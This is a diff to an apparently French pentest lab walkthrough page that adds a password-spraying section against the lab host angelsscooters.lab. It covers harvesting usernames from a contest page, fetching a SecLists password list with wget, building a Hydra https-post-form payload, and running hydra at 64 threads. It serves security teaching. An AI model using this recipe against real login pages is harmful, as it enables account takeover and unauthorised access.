@@ -644,7 +644,95 @@ nmap 192.168.6.128/26 -p 6379</code></pre>
 </ul>
 
   </div>
-  <div id="s7" class="content"><div class="section-title">VII. Password Spraying – Advanced</div></div>
+  <div id="s7" class="content"><div class="section-title">VII. Password Spraying – Advanced</div>
+    <h3>🔎 Reconnaissance</h3>
+
+<p>
+  Les résultats du concours photo <b>Urban with Scooters</b> sont publiés.  
+  Vous pouvez y récupérer les <b>noms d’utilisateurs</b> pour créer votre dictionnaire.
+</p>
+
+<p>
+  Alternativement, les identifiants des utilisateurs peuvent être trouvés sur la page  
+  <b>Sundown Scooters</b>.
+</p>
+
+<hr>
+
+<h3>📚 Création de dictionnaires</h3>
+
+<p>
+  1️⃣ Rendez-vous sur la page du concours <b>Urban with Scooters</b> et collectez les noms des participants.
+</p>
+
+<p>
+  2️⃣ Enregistrez ces noms d’utilisateurs dans le fichier dictionnaire :
+</p>
+
+<pre><code>/tmp/usernames</code></pre>
+
+<p>
+  3️⃣ Pour télécharger la liste des <b>100 pires mots de passe</b> (SecLists), utilisez :
+</p>
+
+<pre><code>wget -O /tmp/passwords https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/worst-passwords-2017-top100-slashdata.txt</code></pre>
+
+<hr>
+
+<h3>🔐 Password Spraying</h3>
+
+<p>Créez un <b>payload Hydra</b> contenant 3 éléments :</p>
+
+<h4>1️⃣ L’URL de la page de connexion</h4>
+<pre><code>/index.php?page=login</code></pre>
+
+<h4>2️⃣ Le corps de la requête (Request Body)</h4>
+<p>
+  Pour obtenir le Request Body :  
+  Ouvrez les <b>Outils de développement</b> (Clic droit → Inspecter ou Ctrl+Shift+I),  
+  puis l’onglet <b>Network</b>.  
+  Effectuez une tentative de connexion et capturez la requête POST.
+</p>
+
+<p>
+  Exemple de tentative de login avec <code>test:test</code> :
+</p>
+<pre><code>username=test&password=test</code></pre>
+
+<p>
+  Remplacez ensuite :
+</p>
+<ul>
+  <li><code>username=test</code> → <code>username=^USER^</code></li>
+  <li><code>password=test</code> → <code>password=^PASS^</code></li>
+</ul>
+
+<h4>3️⃣ Le message d’erreur retourné</h4>
+<p>
+  Après une tentative ratée, l’application renvoie :  
+  <b>"unable to log in with that info"</b>  
+  → Ce message servira de 3ᵉ variable dans votre payload Hydra.
+</p>
+
+<h3>📦 Payload final</h3>
+
+<pre><code>'/index.php?page=login:username=^USER^&password=^PASS^:unable to log in with that info'</code></pre>
+
+<hr>
+
+<h3>🚀 Exécuter l’attaque Hydra</h3>
+
+<p>Utilisez :</p>
+<ul>
+  <li>le dictionnaire des utilisateurs : <code>/tmp/usernames</code></li>
+  <li>le dictionnaire des mots de passe : <code>/tmp/passwords</code></li>
+  <li>la méthode <code>https-post-form</code></li>
+  <li>le payload construit précédemment</li>
+</ul>
+
+<pre><code>hydra -t 64 -L /tmp/usernames -P /tmp/passwords angelsscooters.lab -u -V https-post-form '/index.php?page=login:username=^USER^&password=^PASS^:unable to log in with that info' -f</code></pre>
+
+  </div>
   <div id="s8" class="content"><div class="section-title">VIII. WPScan – Advanced</div></div>
   <div id="s9" class="content"><div class="section-title">IX. Macro Malware – Advanced</div></div>
   <div id="s10" class="content"><div class="section-title">X. Tomcat & LSASS Dump – Advanced</div></div>
